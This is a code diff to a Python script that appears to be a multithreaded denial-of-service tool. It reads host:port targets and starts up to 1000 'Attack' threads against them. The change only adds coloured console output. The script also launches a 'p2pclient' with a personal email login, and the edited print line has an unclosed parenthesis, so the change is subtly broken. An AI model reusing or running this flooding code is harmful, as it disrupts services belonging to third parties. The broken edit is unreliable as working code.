@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 import socket,time,threading,sys,random,os,subprocess,requests,urllib.request
-from os import getcwd
+from termcolor import colored
 
 with open('test.txt', 'w') as f:
     process = subprocess.Popen(['p2pclient', '--login', 'war030578@gmail.com'],
@@ -37,7 +37,7 @@ while 1 == 1:
         count_threads = int(1000//count_targets)
         for row in rrows:
             trgt = row.split(":")
-            print ("Starting atack to %s with %s threads on %s port" % (trgt[0], count_threads, trgt[1]))
+            print (colored("Starting atack to %s with %s threads on %s port" % (trgt[0], count_threads, trgt[1]), 'green')
             for i in range(count_threads):
                 #print ("Starting %s thread", i)
                 threading.Thread(target=Attack, args=(trgt[0], int(trgt[1]), 1024, timeout,)).start()
